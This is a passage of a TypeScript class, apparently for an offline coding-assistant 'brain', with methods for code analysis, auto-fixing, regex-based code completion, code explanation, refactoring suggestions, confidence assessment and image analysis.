      : `Found ${baseReview.issues.length} issue(s): ${errorCount} errors, ${warningCount} warnings, ${infoCount} info. Score: ${baseReview.score}/100`

    return baseReview
  }

  // ── Deep Code Analysis (new — powered by CodeMaster) ──

  /**
   * Perform deep code analysis: complexity metrics, anti-patterns,
   * dependency mapping, code smells, and security scanning.
   * Returns much richer data than reviewCode.
   */
  analyzeCode(code: string, language?: string): CodeAnalysis {
    this.stats.totalCodeAnalyses++
    this.stats.lastUsedAt = new Date().toISOString()
    return this.codeAnalyzer.analyze(code, language as AnalysisLanguage | undefined)
  }

  // ── Auto-Fix Code (new — powered by CodeMaster) ──

  /**
   * Automatically fix detected issues in code.
   * Returns the fixed code, applied fixes with diffs, and rollback state.
   */
  fixCode(code: string, language: string): FixResult {
    this.stats.totalCodeFixes++
    this.stats.lastUsedAt = new Date().toISOString()
    const lang = language as AnalysisLanguage

    // First review to find issues
    const review = this.codeReviewer.review(code, lang)
    const result = this.codeFixer.fixCode(code, lang, review.findings)

    // Learn from successful fixes
    if (this.config.learningEnabled && result.summary.applied > 0) {
      const fixedCode = this.codeFixer.applyFixes(
        code,
        result.fixes.filter(f => f.applied),
      ).code
      this.codeLearningEngine.learnFromFix(code, fixedCode, lang, 'auto-fix')
    }

    return result
  }

  // ── Problem Decomposition (new — powered by CodeMaster) ──

  /**
   * Break a complex coding task into ordered, dependency-aware steps.
   * Useful for planning large features, refactors, or bug fixes.
   */
  decomposeTask(description: string): TaskPlan {
    this.stats.totalDecompositions++
    this.stats.lastUsedAt = new Date().toISOString()
    return this.problemDecomposer.decompose(description)
  }

  // ── Code Learning Engine Access ──

  /** Get the CodeMaster learning engine for direct access to learned patterns. */
  getCodeLearningEngine(): LearningEngine {
    return this.codeLearningEngine
  }

  /** Get CodeMaster deep review output (richer than reviewCode). */
  deepReview(code: string, language?: string): CodeReviewOutput {
    const lang = language as AnalysisLanguage | undefined
    return this.codeReviewer.review(code, lang)
  }

  // ── Performance Analysis (powered by CodeMaster PerformanceAnalyzer) ──

  /**
   * Analyze code for performance issues: Big-O complexity, nested loops,
   * allocation in loops, memoization opportunities, etc.
   */
  analyzePerformance(code: string, language?: string): ReturnType<PerformanceAnalyzer['analyze']> {
    if (language) this.performanceAnalyzer.setLanguage(language as AnalysisLanguage)
    return this.performanceAnalyzer.analyze(code)
  }

  /** Estimate Big-O complexity of a code snippet. */
  estimateComplexity(code: string): ReturnType<PerformanceAnalyzer['estimateComplexity']> {
    return this.performanceAnalyzer.estimateComplexity(code)
  }

  // ── Type Safety Analysis (powered by CodeMaster TypeFlowAnalyzer) ──

  /**
   * Analyze code for type safety issues: unsafe assertions, nullable access,
   * implicit any, non-exhaustive switches, etc.
   */
  analyzeTypeSafety(code: string, language?: string): ReturnType<TypeFlowAnalyzer['analyze']> {
    if (language) this.typeFlowAnalyzer.setLanguage(language as AnalysisLanguage)
    return this.typeFlowAnalyzer.analyze(code)
  }

  // ── Dependency Analysis (powered by CodeMaster DependencyGraphAnalyzer) ──

  /**
   * Analyze dependencies across multiple files: circular deps, unused exports,
   * coupling metrics, import validation.
   */
  analyzeDependencies(files: Array<{ path: string; content: string }>): ReturnType<DependencyGraphAnalyzer['analyzeFiles']> {
    return this.dependencyGraphAnalyzer.analyzeFiles(files)
  }

  // ── Async Flow Analysis (powered by CodeMaster AsyncFlowAnalyzer) ──

  /**
   * Analyze code for async/await issues: missing await, unhandled rejections,
   * race conditions, sequential awaits, floating promises, etc.
   */
  analyzeAsyncFlow(code: string): ReturnType<AsyncFlowAnalyzer['analyze']> {
    return this.asyncFlowAnalyzer.analyze(code)
  }

  // ── Test Coverage Analysis (powered by CodeMaster TestCoverageAnalyzer) ──

  /**
   * Estimate test coverage by comparing source code with test code.
   * Detects untested functions, missing error/edge cases, and coverage gaps.
   */
  analyzeTestCoverage(sourceCode: string, testCode?: string): ReturnType<TestCoverageAnalyzer['analyze']> {
    return this.testCoverageAnalyzer.analyze(sourceCode, testCode)
  }

  // ── Architectural Analysis (powered by CodeMaster ArchitecturalAnalyzer) ──

  /**
   * Analyze code architecture: SOLID violations, god classes/functions,
   * design pattern usage, cohesion/coupling, abstraction opportunities.
   */
  analyzeArchitecture(code: string): ReturnType<ArchitecturalAnalyzer['analyze']> {
    return this.architecturalAnalyzer.analyze(code)
  }

  // ── Code Completion (Phase 1) ──

  /**
   * Complete partial code based on context and cursor position.
   * Analyzes the surrounding code to predict what comes next.
   */
  completeCode(partialCode: string, cursorPosition?: number): CodeCompletionResult {
    this.stats.totalCodeCompletions++
    this.stats.lastUsedAt = new Date().toISOString()

    const pos = cursorPosition ?? partialCode.length
    const before = partialCode.slice(0, pos)
    const after = partialCode.slice(pos)
    const lines = before.split('\n')
    const currentLine = lines[lines.length - 1] ?? ''
    const trimmed = currentLine.trim()

    let insertion = ''
    let confidence = 0.6
    let explanation = ''

    // Detect language from code context
    const langHints = this.detectLanguageFromCode(partialCode)

    // Pattern: incomplete function signature
    if (/function\s+\w+\s*\([^)]*$/.test(trimmed)) {
      insertion = ') {\n  \n}'
      explanation = 'Completed function signature with body'
      confidence = 0.8
    }
    // Pattern: arrow function start
    else if (/=>\s*$/.test(trimmed) || /=>\s*\{\s*$/.test(trimmed)) {
      insertion = trimmed.endsWith('{') ? '\n  return \n}' : '{\n  return \n}'
      explanation = 'Completed arrow function body'
      confidence = 0.7
    }
    // Pattern: if/else/for/while without body
    else if (/\b(if|else if|for|while|else)\b.*\)\s*$/.test(trimmed)) {
      insertion = ' {\n  \n}'
      explanation = 'Added block body for control structure'
      confidence = 0.8
    }
    // Pattern: class declaration
    else if (/class\s+\w+(\s+extends\s+\w+)?\s*$/.test(trimmed)) {
      insertion = ' {\n  constructor() {\n    \n  }\n}'
      explanation = 'Completed class with constructor'
      confidence = 0.7
    }
    // Pattern: interface/type with opening brace
    else if (/(?:interface|type)\s+\w+\s*(?:=\s*)?\{\s*$/.test(trimmed)) {
      insertion = '\n  \n}'
      explanation = 'Added closing brace for type definition'
      confidence = 0.8
    }
    // Pattern: import statement start
    else if (/^import\s+\{\s*$/.test(trimmed)) {
      insertion = ' } from \'\''
      explanation = 'Completed import statement structure'
      confidence = 0.6
    }
    // Pattern: return statement with nothing
    else if (/return\s*$/.test(trimmed)) {
      insertion = ' null'
      explanation = 'Added default return value'
      confidence = 0.4
    }
    // Pattern: try without catch
    else if (/try\s*\{\s*$/.test(trimmed) || (before.includes('try {') && !before.includes('catch'))) {
      const lastBrace = before.lastIndexOf('}')
      if (lastBrace === before.length - 1 || trimmed === '}') {
        insertion = ' catch (error) {\n  console.error(error)\n}'
        explanation = 'Added catch block for try statement'
        confidence = 0.7
      }
    }
    // Pattern: switch without case
    else if (/switch\s*\([^)]+\)\s*\{\s*$/.test(trimmed)) {
      insertion = '\n  case \'\':\n    break\n  default:\n    break\n}'
      explanation = 'Added case structure for switch'
      confidence = 0.6
    }
    // Pattern: array/object literal opening
    else if (/(?:const|let|var)\s+\w+\s*=\s*\[\s*$/.test(trimmed)) {
      insertion = '\n  \n]'
      explanation = 'Closed array literal'
      confidence = 0.7
    }
    else if (/(?:const|let|var)\s+\w+\s*=\s*\{\s*$/.test(trimmed)) {
      insertion = '\n  \n}'
      explanation = 'Closed object literal'
      confidence = 0.7
    }
    // Pattern: Python def without body
    else if (/def\s+\w+\([^)]*\)\s*:\s*$/.test(trimmed)) {
      insertion = '\n    pass'
      explanation = 'Added Python function body placeholder'
      confidence = 0.7
    }
    // Pattern: Python class without body
    else if (/class\s+\w+.*:\s*$/.test(trimmed) && langHints === 'python') {
      insertion = '\n    def __init__(self):\n        pass'
      explanation = 'Added Python class constructor'
      confidence = 0.7
    }
    // Fallback: try to close open brackets
    else {
      const opens = (before.match(/[{[(]/g) ?? []).length
      const closes = (before.match(/[}\])]/g) ?? []).length
      if (opens > closes) {
        const diff = opens - closes
        const closers = before.lastIndexOf('{') > before.lastIndexOf('[') ? '}' : ']'
        insertion = closers.repeat(diff)
        explanation = `Closed ${diff} open bracket(s)`
        confidence = 0.5
      } else {
        insertion = '\n'
        explanation = 'No clear completion pattern detected'
        confidence = 0.2
      }
    }

    return {
      completedCode: before + insertion + after,
      insertion,
      confidence,
      explanation,
    }
  }

  // ── Code Explanation (Phase 4) ──

  /**
   * Explain what a piece of code does, its complexity, and potential issues.
   * Produces clear, structured explanations.
   */
  explainCode(code: string, language?: string): CodeExplanationResult {
    this.stats.totalCodeExplanations++
    this.stats.lastUsedAt = new Date().toISOString()

    const lang = language ?? this.detectLanguageFromCode(code)
    const lines = code.split('\n')
    const steps: string[] = []
    const issues: string[] = []
    const concepts: string[] = []

    // Run deep analysis
    const analysis = this.codeAnalyzer.analyze(code, lang as AnalysisLanguage)

    // Build summary from analysis
    let summary = `This is a ${lang} code block with ${lines.length} lines.`

    // Detect structures
    const functionMatches = code.match(/(?:function|def|fn|func)\s+(\w+)/g) ?? []
    const classMatches = code.match(/(?:class|struct|interface)\s+(\w+)/g) ?? []
    const importMatches = code.match(/(?:import|require|use|include|from)\b/g) ?? []

    if (functionMatches.length > 0) {
      steps.push(`Defines ${functionMatches.length} function(s): ${functionMatches.map(f => f.split(/\s+/)[1]).join(', ')}`)
      concepts.push('functions')
    }
    if (classMatches.length > 0) {
      steps.push(`Defines ${classMatches.length} class(es): ${classMatches.map(c => c.split(/\s+/)[1]).join(', ')}`)
      concepts.push('classes')
    }
    if (importMatches.length > 0) {
      steps.push(`Has ${importMatches.length} import(s)/dependency references`)
      concepts.push('modules')
    }

    // Detect patterns
    if (/async|await|Promise|then\(/.test(code)) {
      concepts.push('async programming')
      steps.push('Uses asynchronous operations (async/await or Promises)')
    }
    if (/try\s*\{[\s\S]*catch/.test(code)) {
      concepts.push('error handling')
      steps.push('Includes try/catch error handling')
    }
    if (/\.(map|filter|reduce|forEach)\(/.test(code)) {
      concepts.push('functional programming')
      steps.push('Uses functional array methods (map/filter/reduce)')
    }
    if (/for\s*\(|while\s*\(|\.forEach\(/.test(code)) {
      concepts.push('iteration')
      steps.push('Contains loops/iteration')
    }
    if (/if\s*\(|switch\s*\(|\?.*:/.test(code)) {
      concepts.push('conditionals')
      steps.push('Contains conditional logic')
    }
    if (/export|module\.exports/.test(code)) {
      concepts.push('module exports')
      steps.push('Exports functionality for use by other modules')
    }

    // Check for issues
    if (analysis?.smells?.length > 0) {
      for (const smell of analysis.smells.slice(0, 3)) {
        issues.push(`Code smell: ${smell.type} — ${smell.description}`)
      }
    }
    if (analysis?.security?.length > 0) {
      for (const sec of analysis.security.slice(0, 3)) {
        issues.push(`Security: ${sec.type} (${sec.severity}) — ${sec.description}`)
      }
    }
    if (analysis?.antiPatterns?.length > 0) {
      for (const ap of analysis.antiPatterns.slice(0, 3)) {
        issues.push(`Anti-pattern: ${ap.name} — ${ap.description}`)
      }
    }

    // Update summary with what was found
    const parts = []
    if (functionMatches.length > 0) parts.push(`${functionMatches.length} function(s)`)
    if (classMatches.length > 0) parts.push(`${classMatches.length} class(es)`)
    if (parts.length > 0) summary += ` It contains ${parts.join(' and ')}.`
    if (issues.length > 0) summary += ` Found ${issues.length} potential issue(s).`
    else summary += ' No significant issues detected.'

    // Enhance with analogy-based explanations for detected concepts
    if (this.analogicalReasoner && concepts.length > 0) {
      for (const concept of concepts.slice(0, 3)) {
        const analogy = this.analogicalReasoner.explain(concept, 'beginner')
        if (analogy) {
          steps.push(`Analogy: ${analogy}`)
        }
      }
    }

    return {
      summary,
      steps,
      complexity: (analysis?.complexity?.cyclomaticComplexity ?? 0) > 10
        ? `High (cyclomatic complexity: ${analysis?.complexity?.cyclomaticComplexity ?? 0})`
        : (analysis?.complexity?.cyclomaticComplexity ?? 0) > 5
          ? `Medium (cyclomatic complexity: ${analysis?.complexity?.cyclomaticComplexity ?? 0})`
          : `Low (cyclomatic complexity: ${analysis?.complexity?.cyclomaticComplexity ?? 0})`,
      issues,
      language: lang,
      concepts,
    }
  }

  // ── Multi-Step Reasoning (Phase 4) ──

  /**
   * Solve a problem using chain-of-thought: decompose → plan → generate → review → refine.
   * Enhanced with ReasoningEngine for structured multi-phase reasoning and MetaCognition for confidence calibration.
   */
  async reason(question: string): Promise<ReasoningResult> {
    const start = Date.now()
    this.stats.totalMultiStepReasons++
    this.stats.lastUsedAt = new Date().toISOString()

    const steps: ReasoningStep[] = []

    // Use ReasoningEngine for structured decomposition if available
    if (this.reasoningEngine) {
      const subProblems = this.reasoningEngine.decompose(question)
      if (subProblems.length > 0) {
        steps.push({
          type: 'decompose',
          description: 'ReasoningEngine decomposed the problem into sub-problems',
          output: `Sub-problems: ${subProblems.slice(0, 5).map(sp => sp.description).join('; ')}`,
        })
      }
    }

    // Use AnalogicalReasoner to find relevant analogies for the problem
    if (this.analogicalReasoner) {
      const analogies = this.analogicalReasoner.findAnalogies(question, 2)
      for (const analogy of analogies) {
        steps.push({
          type: 'plan',
          description: `Analogy: ${analogy.explanation}`,
          output: `Similarity: ${Math.round(analogy.similarity * 100)}%`,
        })
      }
    }

    // Step 1: Decompose the problem
    const keywords = extractKeywords(question)
    const intent = detectIntent(question)
    steps.push({
      type: 'decompose',
      description: 'Analyzing the question and identifying key components',
      output: `Intent: ${intent}. Keywords: ${keywords.slice(0, 10).join(', ')}`,
    })

    // Step 2: Plan approach
    const knowledgeResults = searchKnowledge(this.knowledgeBase, keywords, 5)
    const _relevantKnowledge = knowledgeResults.map(r => r.entry.content).join('\n')
    steps.push({
      type: 'plan',
      description: 'Searching knowledge base and planning response',
      output: `Found ${knowledgeResults.length} relevant knowledge entries`,
    })

    // Step 2b: Advanced search with thinking — learn from results
    if (this.advancedSearchEngine) {
      try {
        const searchResult = this.advancedSearchEngine.searchWithThinking(question)
        if (searchResult.results.length > 0) {
          // Learn from search results to grow the brain's knowledge
          this.learnFromSearchResults(question, searchResult)
          steps.push({
            type: 'plan',
            description: 'Advanced search with thinking — learning from results',
            output: `Searched with ${searchResult.strategiesUsed.length} strategies (${(searchResult.confidence * 100).toFixed(0)}% confidence). Found ${searchResult.results.length} results. Learned top ${Math.min(searchResult.results.length, 5)} into knowledge base.`,
          })
        }
      } catch { /* non-critical */ }
    }

    // Step 3: Generate initial answer
    let answer = buildResponse(intent, question, knowledgeResults, this.learnedPatterns, this.conversationHistory, this.config.creativity)
    steps.push({
      type: 'generate',
      description: 'Generating initial response based on knowledge',
      output: answer.slice(0, 200) + (answer.length > 200 ? '...' : ''),
    })

    // Step 4: Self-review — check if answer addresses the question
    const answerKeywords = extractKeywords(answer)
    const questionCoverage = keywords.filter(k => answerKeywords.some(ak => ak.includes(k) || k.includes(ak))).length / Math.max(keywords.length, 1)

    steps.push({
      type: 'review',
      description: 'Self-reviewing response quality',
      output: `Question coverage: ${Math.round(questionCoverage * 100)}%. Knowledge entries used: ${knowledgeResults.length}`,
    })

    // Step 5: Refine if coverage is low
    if (questionCoverage < 0.3 && knowledgeResults.length > 1) {
      // Combine multiple knowledge entries for a more comprehensive answer
      const combined = knowledgeResults.slice(0, 3).map(r => r.entry.content).join('\n\n')
      answer = `Here's what I know about this topic:\n\n${combined}`
      steps.push({
        type: 'refine',
        description: 'Enriching response with additional knowledge',
        output: 'Combined multiple knowledge entries for comprehensive answer',
      })
    }

    // Update conversation context
    this.updateConversationContext(question, answer)

    // Use MetaCognition for calibrated confidence if available
    let confidence: number
    if (this.metaCognition) {
      const assessment = this.metaCognition.assessConfidence(question, answer)
      confidence = Math.min(1, (assessment.calibrated * 0.4) + (questionCoverage * 0.3) + (knowledgeResults.length > 0 ? 0.2 : 0) + (knowledgeResults.length > 2 ? 0.1 : 0))
      this.metaCognition.recordOutcome(confidence, questionCoverage > 0.3 ? 0.8 : 0.3)
    } else {
      confidence = Math.min(1, (questionCoverage * 0.5) + (knowledgeResults.length > 0 ? 0.3 : 0) + (knowledgeResults.length > 2 ? 0.2 : 0))
    }

    return {
      answer,
      steps,
      confidence,
      durationMs: Date.now() - start,
    }
  }

  // ── Multi-File Code Generation (Phase 1) ──

  /**
   * Generate multiple related files together (e.g., component + test + types).
   */
  async generateMultiFile(description: string, language: ProgrammingLanguage, fileTypes?: string[]): Promise<MultiFileResult> {
    this.stats.totalMultiFileGenerations++
    this.stats.lastUsedAt = new Date().toISOString()

    const types = fileTypes ?? this.inferFileTypes(description)
    const files: GeneratedFile[] = []
    const name = toCamelCase(extractMainSubject(description))
    const pascalName = name.charAt(0).toUpperCase() + name.slice(1)

    for (const fileType of types) {
      let filename = ''
      let desc = description
      let lang = language

      switch (fileType) {
        case 'component': {
          filename = language === 'typescript' ? `${pascalName}.tsx` : `${pascalName}.jsx`
          desc = `React component for ${description}`
          break
        }
        case 'test': {
          filename = language === 'typescript' ? `${pascalName}.test.ts` : `${pascalName}.test.js`
          desc = `Unit tests for ${description}`
          break
        }
        case 'types': {
          filename = `${pascalName}.types.ts`
          desc = `TypeScript types/interfaces for ${description}`
          lang = 'typescript'
          break
        }
        case 'styles': {
          filename = `${pascalName}.module.css`
          desc = `CSS module styles for ${description}`
          lang = 'css'
          break
        }
        case 'hook': {
          filename = `use${pascalName}.ts`
          desc = `Custom React hook for ${description}`
          break
        }
        case 'api': {
          filename = language === 'typescript' ? `${name}.api.ts` : `${name}.api.js`
          desc = `API route handler for ${description}`
          break
        }
        case 'model': {
          filename = language === 'typescript' ? `${name}.model.ts` : `${name}.model.js`
          desc = `Data model for ${description}`
          break
        }
        case 'service': {
          filename = language === 'typescript' ? `${name}.service.ts` : `${name}.service.js`
          desc = `Service layer for ${description}`
          break
        }
        default: {
          filename = language === 'typescript' ? `${name}.ts` : `${name}.js`
          break
        }
      }

      const result = generateCodeLocally({ description: desc, language: lang, style: 'production' })
      files.push({
        filename,
        content: result.code,
        language: lang,
        lines: result.linesOfCode,
      })
    }

    const totalLines = files.reduce((sum, f) => sum + f.lines, 0)
    return {
      files,
      totalLines,
      explanation: `Generated ${files.length} files (${totalLines} total lines) for: ${description}. Files: ${files.map(f => f.filename).join(', ')}`,
    }
  }

  // ── Refactoring Suggestions (Phase 2) ──

  /**
   * Detect code smells and suggest refactored versions.
   */
  suggestRefactorings(code: string, language?: string): RefactoringSuggestion[] {
    const lang = (language ?? this.detectLanguageFromCode(code)) as AnalysisLanguage
    const analysis = this.codeAnalyzer.analyze(code, lang)
    const suggestions: RefactoringSuggestion[] = []
    const lines = code.split('\n')

    // Check for long methods
    const funcStarts: { name: string; start: number; end: number }[] = []
    let braceCount = 0
    let currentFunc = ''
    let funcStart = -1
    for (let i = 0; i < lines.length; i++) {
      const line = lines[i]!
      const funcMatch = line.match(/(?:function|def|fn|func|async\s+function)\s+(\w+)/)
      if (funcMatch) {
        currentFunc = funcMatch[1]!
        funcStart = i
      }
      braceCount += (line.match(/\{/g) ?? []).length - (line.match(/\}/g) ?? []).length
      if (funcStart >= 0 && braceCount === 0 && i > funcStart) {
        funcStarts.push({ name: currentFunc, start: funcStart, end: i })
        funcStart = -1
      }
    }

    for (const func of funcStarts) {
      const length = func.end - func.start + 1
      if (length > 30) {
        suggestions.push({
          smell: 'Long Method',
          location: `lines ${func.start + 1}-${func.end + 1}`,
          description: `Function '${func.name}' is ${length} lines long`,
          suggestion: 'Extract logical sections into smaller helper functions. Each function should do one thing well.',
          priority: length > 60 ? 'high' : 'medium',
        })
      }
    }

    // Check for magic numbers
    const magicNumberPattern = /(?<!["\w])(?<!\.)(\d{2,})(?!\d)(?!["\w])/g
    const seenNumbers = new Set<string>()
    for (let i = 0; i < lines.length; i++) {
      const line = lines[i]!
      if (/^\s*\/\/|^\s*#|^\s*\*/.test(line)) continue // skip comments
      let match
      while ((match = magicNumberPattern.exec(line)) !== null) {
        const num = match[1]!
        if (!seenNumbers.has(num) && !['100', '1000', '10'].includes(num)) {
          seenNumbers.add(num)
          suggestions.push({
            smell: 'Magic Number',
            location: `line ${i + 1}`,
            description: `Magic number ${num} found — unclear meaning`,
            suggestion: `Extract to a named constant: const MEANINGFUL_NAME = ${num}`,
            priority: 'low',
          })
          break // one per line is enough
        }
      }
    }

    // Check for deep nesting
    let maxNesting = 0
    let maxNestLine = 0
    for (let i = 0; i < lines.length; i++) {
      const leadingSpaces = (lines[i]!.match(/^(\s*)/) ?? [''])[0]!.length
      const indent = leadingSpaces / 2 // assume 2-space indent
      if (indent > maxNesting) {
        maxNesting = indent
        maxNestLine = i + 1
      }
    }
    if (maxNesting >= 4) {
      suggestions.push({
        smell: 'Deep Nesting',
        location: `line ${maxNestLine}`,
        description: `Code is nested ${maxNesting} levels deep`,
        suggestion: 'Use early returns (guard clauses), extract inner logic into functions, or use strategy pattern',
        priority: maxNesting >= 6 ? 'high' : 'medium',
      })
    }

    // Check for duplicate code patterns (simple)
    const lineGroups = new Map<string, number[]>()
    for (let i = 0; i < lines.length; i++) {
      const trimmed = lines[i]!.trim()
      if (trimmed.length > 20 && !trimmed.startsWith('//') && !trimmed.startsWith('#') && !trimmed.startsWith('*')) {
        const existing = lineGroups.get(trimmed) ?? []
        existing.push(i + 1)
        lineGroups.set(trimmed, existing)
      }
    }
    for (const [line, positions] of lineGroups) {
      if (positions.length >= 3) {
        suggestions.push({
          smell: 'Duplicate Code',
          location: `lines ${positions.join(', ')}`,
          description: `Same code appears ${positions.length} times: "${line.slice(0, 60)}..."`,
          suggestion: 'Extract duplicated code into a reusable function',
          priority: 'medium',
        })
        break // report first duplicate only
      }
    }

    // Check for God class (from CodeAnalyzer)
    for (const smell of analysis?.smells ?? []) {
      if (smell.type === 'god-class' || smell.type === 'large-class') {
        suggestions.push({
          smell: 'God Class',
          location: `entire file`,
          description: smell.description,
          suggestion: 'Split into multiple classes with single responsibilities. Use composition over inheritance.',
          priority: 'high',
        })
      }
    }

    return suggestions.sort((a, b) => {
      const pri = { high: 0, medium: 1, low: 2 }
      return pri[a.priority] - pri[b.priority]
    })
  }

  // ── Conversation Memory (Phase 4) ──

  /** Get the current conversation context (what the brain remembers about the session). */
  getConversationContext(): Readonly<ConversationContext> {
    return { ...this.conversationContext }
  }

  /** Get user preferences (learned coding style). */
  getUserPreferences(): Readonly<UserPreferences> {
    return { ...this.userPreferences }
  }

  /** Update user preference for coding style. */
  setUserPreference<K extends keyof UserPreferences>(key: K, value: UserPreferences[K]): void {
    this.userPreferences[key] = value
    this.userPreferences.lastUpdated = new Date().toISOString()
  }

  // ── Active Learning (Phase 5) ──

  /**
   * Assess confidence for a question. If low, returns clarifying questions instead of guessing.
   * Enhanced with MetaCognition for calibrated confidence assessment and knowledge gap detection.
   */
  assessConfidence(question: string): { confident: boolean; score: number; clarifyingQuestions?: string[] } {
    const keywords = extractKeywords(question)
    const knowledgeResults = searchKnowledge(this.knowledgeBase, keywords, 3)
    const patternMatch = findBestLearnedPattern(question, this.learnedPatterns)

    // Calculate base confidence
    let score = 0
    if (knowledgeResults.length > 0) score += Math.min(knowledgeResults[0]!.score / 5, 0.5)
    if (patternMatch) score += patternMatch.confidence * 0.5

    // Use MetaCognition for calibrated confidence if available
    if (this.metaCognition) {
      const assessment = this.metaCognition.assessConfidence(question, 'pending answer')
      // Blend local score with MetaCognition assessment (60% local, 40% meta)
      score = score * 0.6 + assessment.calibrated * 0.4

      // Use knowledge gap detection for better clarifying questions
      if (score < 0.5) {
        const gaps = this.metaCognition.detectKnowledgeGaps([question])
        const clarifyingQuestions: string[] = []

        // Add gap-specific questions
        for (const gap of gaps.slice(0, 2)) {
          clarifyingQuestions.push(`Could you clarify about ${gap.topic}? I'm not fully confident in this area.`)
        }

        if (keywords.length < 2) {
          clarifyingQuestions.push('Could you provide more details about what you\'re looking for?')
        }
        if (!this.conversationContext.currentLanguage) {
          clarifyingQuestions.push('Which programming language are you working with?')
        }
        if (/\b(fix|bug|error|issue)\b/i.test(question) && !code_likeContent(question)) {
          clarifyingQuestions.push('Could you share the code that\'s causing the issue?')
          clarifyingQuestions.push('What error message are you seeing?')
        }
        if (/\b(best|better|should|recommend)\b/i.test(question)) {
          clarifyingQuestions.push('What are your specific requirements or constraints?')
        }
        if (clarifyingQuestions.length === 0) {
          clarifyingQuestions.push('Could you rephrase or provide more context for your question?')
        }

        return { confident: false, score, clarifyingQuestions }
      }

      return { confident: true, score }
    }

    if (score >= 0.5) {
      return { confident: true, score }
    }

    // Generate clarifying questions (fallback without MetaCognition)
    const clarifyingQuestions: string[] = []
    if (keywords.length < 2) {
      clarifyingQuestions.push('Could you provide more details about what you\'re looking for?')
    }
    if (!this.conversationContext.currentLanguage) {
      clarifyingQuestions.push('Which programming language are you working with?')
    }
    if (/\b(fix|bug|error|issue)\b/i.test(question) && !code_likeContent(question)) {
      clarifyingQuestions.push('Could you share the code that\'s causing the issue?')
      clarifyingQuestions.push('What error message are you seeing?')
    }
    if (/\b(best|better|should|recommend)\b/i.test(question)) {
      clarifyingQuestions.push('What are your specific requirements or constraints?')
    }
    if (clarifyingQuestions.length === 0) {
      clarifyingQuestions.push('Could you rephrase or provide more context for your question?')
    }

    return { confident: false, score, clarifyingQuestions }
  }

  // ── Private helpers for new features ──

  /** Detect language from code content heuristically. */
  private detectLanguageFromCode(code: string): string {
    if (/\bfn\s+\w+\s*\(/.test(code) && /->/.test(code)) return 'rust'
    if (/\bfunc\s+\w+\s*\(/.test(code) && /\bpackage\b/.test(code)) return 'go'
    if (/\bdef\s+\w+\s*\(/.test(code) && /:\s*$/.test(code.split('\n')[0] ?? '')) return 'python'
    if (/\binterface\b|\btype\b.*=.*\{/.test(code) && /:\s*(string|number|boolean)/.test(code)) return 'typescript'
    if (/\bclass\b.*\bextends\b/.test(code) && /public\s+(static\s+)?void/.test(code)) return 'java'
    if (/import\s+\w+\s+from/.test(code) || /const\s+\w+\s*=/.test(code)) return 'typescript'
    if (/\bvar\s+\w+\b/.test(code) && /\bfmt\./.test(code)) return 'go'
    if (/\blet\b|\bconst\b|\bvar\b/.test(code)) return 'javascript'
    return 'unknown'
  }

  /** Infer which file types to generate based on description. */
  private inferFileTypes(description: string): string[] {
    const lower = description.toLowerCase()
    const types: string[] = []

    if (/\b(component|ui|widget|view)\b/.test(lower)) {
      types.push('component', 'test', 'types', 'styles')
    } else if (/\b(api|endpoint|route|handler)\b/.test(lower)) {
      types.push('api', 'test', 'types')
    } else if (/\b(model|entity|schema)\b/.test(lower)) {
      types.push('model', 'test', 'types')
    } else if (/\b(service|manager|provider)\b/.test(lower)) {
      types.push('service', 'test', 'types')
    } else if (/\b(hook|use\w+)\b/.test(lower)) {
      types.push('hook', 'test')
    } else {
      types.push('component', 'test')
    }

    return types
  }

  /** Update conversation context from the current exchange. */
  private updateConversationContext(userMessage: string, _response: string): void {
    // Detect file references
    const fileMatch = userMessage.match(/(?:file|in)\s+["`']?(\w+\.\w+)["`']?/i)
    if (fileMatch) this.conversationContext.currentFile = fileMatch[1]!

    // Detect function references
    const funcMatch = userMessage.match(/(?:function|method|def)\s+["`']?(\w+)["`']?/i)
    if (funcMatch) this.conversationContext.currentFunction = funcMatch[1]!

    // Detect language references
    const langPatterns: [RegExp, string][] = [
      [/\btypescript\b|\bts\b/i, 'typescript'], [/\bjavascript\b|\bjs\b/i, 'javascript'],
      [/\bpython\b|\bpy\b/i, 'python'], [/\brust\b/i, 'rust'], [/\bgo\b|\bgolang\b/i, 'go'],
      [/\bjava\b/i, 'java'], [/\bc#\b|\bcsharp\b/i, 'csharp'], [/\bc\+\+\b|\bcpp\b/i, 'cpp'],
    ]
    for (const [pattern, lang] of langPatterns) {
      if (pattern.test(userMessage)) {
        this.conversationContext.currentLanguage = lang
        break
      }
    }

    // Track topics
    const keywords = extractKeywords(userMessage)
    const topic = keywords.slice(0, 3).join(' ')
    if (topic && !this.conversationContext.topicStack.includes(topic)) {
      this.conversationContext.topicStack.push(topic)
      if (this.conversationContext.topicStack.length > 20) {
        this.conversationContext.topicStack.shift()
      }
    }
  }

  // ── Image Analysis (same interface as AiBrain.analyzeImage) ──

  /** Analyze image with deep offline understanding via ImageAnalyzer. */
  async analyzeImage(request: ImageAnalysisRequest): Promise<ImageAnalysisResult> {
    this.stats.totalImageAnalyses++
    this.stats.lastUsedAt = new Date().toISOString()

    if (!isSupportedImageType(request.mediaType)) {
      throw new Error(`Unsupported image type: ${request.mediaType}`)
    }
    if (!validateImageData(request.imageData)) {
      throw new Error('Invalid image data')
    }

    // Use deep ImageAnalyzer if available (Phase 11)
    if (this.imageAnalyzer) {
      const deepResult = this.imageAnalyzer.analyze(request.imageData, request.mediaType, request.question)
      return {
        description: deepResult.description,
        objects: deepResult.scene.subjects.slice(),
        colors: deepResult.pixelAnalysis.dominantColors.map(c => c.name),
        text: deepResult.textRegions.length > 0
          ? deepResult.textRegions.map(r => r.text).join('; ')
          : undefined,
        sentiment: deepResult.scene.mood,
        tags: deepResult.classification.tags.slice(),
      }
    }

    // Fallback: basic metadata analysis
    const sizeBytes = Math.floor(request.imageData.length * 0.75)
    const sizeKB = Math.round(sizeBytes / 1024)
    const format = request.mediaType.split('/')[1] ?? 'unknown'

    const description = `Image analysis (offline mode): ${format.toUpperCase()} image, approximately ${sizeKB}KB. ` +
      (request.question ? `User question: "${request.question}". ` : '') +
      'Note: Detailed visual analysis requires a vision model. LocalBrain can identify format and size metadata.'

    return parseImageAnalysis(description)
  }

  /**
   * Deep image analysis returning the full DeepImageAnalysis result.
   * Provides pixel analysis, structure, classification, text detection, scene, and quality.
   */
  analyzeImageDeep(imageData: string, mediaType: string, question?: string) {
    if (!this.imageAnalyzer) {
      throw new Error('ImageAnalyzer not available — enable intelligence modules')
    }
    return this.imageAnalyzer.analyze(imageData, mediaType, question)
  }

  // ── Document Analysis ──

  /**
   * Analyze a document (PDF text, markdown, plaintext, code, etc.).
   * Returns structure, keywords, readability, classification, summaries, and more.
   */
